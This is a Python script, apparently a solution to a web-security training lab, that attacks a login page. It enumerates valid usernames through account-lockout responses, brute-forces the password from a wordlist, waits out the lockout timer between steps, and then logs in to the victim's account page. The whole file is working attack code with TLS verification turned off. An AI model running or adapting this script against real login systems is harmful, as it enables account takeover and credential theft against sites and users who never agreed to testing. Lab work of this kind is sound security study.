#!/usr/bin/env python3
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# login request
def login(s, url, username, password):
    data = {"username": username, "password": password}
    r = s.post(url, data=data, allow_redirects=False, verify=False)
    if r.status_code == 302:
        return "success"
    if "Invalid username or password." in r.text:
        return "invalid_user"
    if "too many" in r.text.lower():
        return "locked"
    return "unknown"

# find valid username via account lockout
def get_username(s, url, wordlist):
    print("[*] Enumerating usernames...")
    with open(wordlist, "r") as f:
        for line in f:
            username = line.strip()
            if not username:
                continue
            sys.stdout.write(f"\r[*] Trying: {username:<20}")
            sys.stdout.flush()
            for i in range(1, 5):
                if login(s, url, username, "test") == "locked":
                    print(f"\n[+] Valid username: {username}")
                    return username
    print("\n[-] No valid username found")
    return None

# use discovered username to bruteforce password
def get_password(s, url, username, wordlist):
    print(f"[*] Bruteforcing password for: {username}")
    with open(wordlist, "r") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            sys.stdout.write(f"\r[*] Trying: {password:<20}")
            sys.stdout.flush()
            res = login(s, url, username, password)
            if res == "success" or res == "unknown":
                print(f"\n[+] Valid password: {password}")
                return password
    print("\n[-] No valid password found")
    return None

def main():
    if len(sys.argv) < 4 or len(sys.argv) > 5:
        print(f"[-] Usage:   {sys.argv[0]} <url> <usernames> <passwords> [proxy]")
        sys.exit()
    url       = sys.argv[1].strip().rstrip("/") + "/login"
    usernames = sys.argv[2].strip()
    passwords = sys.argv[3].strip()
    print(f"[*] Target: {url}")
    s = requests.Session()

    # step 1 - find valid username via account lock
    username = get_username(s, url, usernames)
    if not username:
        sys.exit(1)
    print("[*] Waiting 65 seconds for lockout to reset...")
    time.sleep(65)
    s = requests.Session()

    # step 2 - brute force password
    password = get_password(s, url, username, passwords)
    if not password:
        sys.exit(1)
    print("[*] Waiting 65 seconds for lockout to reset before final login...")
    time.sleep(65)
    s = requests.Session()

    # step 3 - final login
    if login(s, url, username, password) == "success":
        print(f"[+] Logged in as {username}:{password}")
    else:
        print("[-] Login failed")

    # step 4 - trigger lab solved
    r = s.get(url.replace("/login", f"/my-account?id={username}"), verify=False)
    if "Log out" in r.text:
        print("[+] Lab solved")
    else:
        print("[-] Account page not reached")

if __name__ == "__main__":
    main()